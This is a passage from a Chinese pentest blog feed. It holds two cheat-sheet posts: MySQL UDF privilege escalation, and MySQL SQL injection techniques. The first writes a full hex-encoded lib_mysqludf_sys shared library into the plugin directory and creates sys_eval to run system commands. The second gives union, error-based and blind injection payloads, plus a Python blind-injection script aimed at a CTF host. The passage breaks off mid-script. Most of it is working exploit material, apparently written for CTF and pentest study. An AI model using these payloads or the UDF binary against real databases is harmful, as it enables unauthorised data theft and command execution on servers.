class="string">&#x27;so文件的16进制编码&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib64/mysql/plugin/lib_mysqludf_sys.so&#x27;</span></span><br><span class="line"></span><br><span class="line"># 将DLL中的函数引入到MySQL数据库中</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;lib_mysqludf_sys.so&#x27;</span>;</span><br></pre></td></tr></table></figure><p>提权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(&quot;whoami&quot;);# 一般不是 root</span><br><span class="line"># 寻找数据库配置文件，查看数据库的账号密码</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> func;</span><br><span class="line"><span class="keyword">select</span> unhex(<span class="string">&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;mysqludf.so&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Privesc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql Injections</title>
      <link href="/2023/07/30/pentest/web-pentest/Mysql%20Injections/"/>
      <url>/2023/07/30/pentest/web-pentest/Mysql%20Injections/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql-Injections"><a href="#Mysql-Injections" class="headerlink" title="Mysql Injections"></a>Mysql Injections</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul><li><code>Spaces</code>：如果未编码，可能表示请求数据的结束</li><li><code>&amp;</code>: 解释为参数分隔符</li><li><code>#</code>: 解释为片段标识符</li></ul><p><strong>GET请求</strong><code>#</code>和 <code>-- ?</code> (?可以为任意字符) 表示注释，可以使它们后面的语句不被执行，可以使用<code>--%20</code>，把空格转换为urlcode编码格式，同理把<code>#</code>变成<code>%23</code>，也可以注释</p><p><strong>POST请求</strong><code>#</code>和<code>--?</code>都能注释后面的语句</p><h3 id="schema结构："><a href="#schema结构：" class="headerlink" title="schema结构："></a>schema结构：</h3><ul><li>information_schema.schemata：记录数据库信息的表</li><li>information_schema.tables：记录表名信息的表</li><li>information_schema.columns：记录列名信息的表</li><li>schema_name：数据库名</li><li>table_name：表名</li><li>column_name：列名</li><li>table_schema：表的数据库名</li></ul><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>可以使用 union 语句，且有回显位</p><p><strong>常用语句和函数</strong></p><ul><li>order by：对指定的字段对结果集进行排序，如果没有该字段就会报错，sql注入用此来判断字段数</li><li>select：从数据库中选取数据</li><li>union：合并两个或多个select语句，select 查询的字段数需要一致</li><li>where：有条件地从表中选取数据</li><li>limit 0,1：从0开始的1个数据</li><li>database()：返回当前数据库</li><li>concat(str1,str2,…,strn) 将多个数据连成字符串</li><li>concat_ws(sep,str1,str2,…strn) 将多个数据连成字符串，中间用sep分隔</li><li>group_concat(str1,str2,…,strn) 将多个数据连成字符串，中间用’,’分隔</li></ul><p><strong>后端代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE id=&#x27;$id&#x27; LIMIT 0,1;</span><br></pre></td></tr></table></figure><p>注入：闭合<code>&#39;</code>注释后面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union select 字段1,……,字段2,table_name from information_schema.tables where schema_name=database() %23</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 字段1,……,字段2,table_name from information_schema.columns where schema_name=database() where table_name=&quot;表名&quot; %23</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 字段1,……,字段2,列名 from 库名(表不重名可省略).表名 %23</span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>不能使用 union()函数，或者没有回显位，源代码中需要有数据库报错的函数</p><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><blockquote><p>updatexml(xml_doument,XPath_string,new_value)：</p><ul><li>第一个参数：是string格式，为XML文档对象的名称</li><li>第二个参数：代表路径，Xpath格式的字符串例如</li><li>第三个参数：string格式，替换查找到的符合条件的数据</li></ul><p>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误(xpath syntax)，最多输出32位，主要利用第二个参数，其他参数任意</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select database())),1) %23</span><br></pre></td></tr></table></figure><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><blockquote><p>extractvalue(XML_document，xpath_string)</p><ul><li>第一个参数：string格式，为XML文档对象的名称                                                                                    </li><li>第二个参数：xpath_string（xpath格式的字符串）</li></ul><p>与updatexml用法相似，最多输出32位</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select database()))) %23</span><br></pre></td></tr></table></figure><h3 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h3><blockquote><p>floor(num) 返回小于等于num该值的最大整数</p><p>count(num) 统计数量</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand(0)*2))as a from users group by a;</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><blockquote><p>exp(num) 返回以e为底，x的对数</p><p>当x&gt;&#x3D;709，exp()就会引起溢出错误，可以用 ~ 运算符按位取反的方式得到一个最大值</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select database()));</span><br></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>布尔注入｜时间注入</p><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">url =<span class="string">&#x27;http://d58efe1f-518c-4f9a-8fb1-bb2ece34dbc0.node4.buuoj.cn:81/?stunum=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>1/**/and/**/(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)%23-&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;&#123;url&#125;1&#x27;/**/and/**/(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users_flag&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)%23&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;&#123;url&#125;1&#x27;/**/and/**/(ascii(mid((select/**/group_concat(password)from(users_flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;)%23&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1^(ascii(mid((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;)%23&quot;</span></span><br><span class="line"></span><br><span class="line">        s = requests.get(url=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hi admin&#x27;</span> <span class="keyword">in</span> s.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">if</span> left != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(left)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 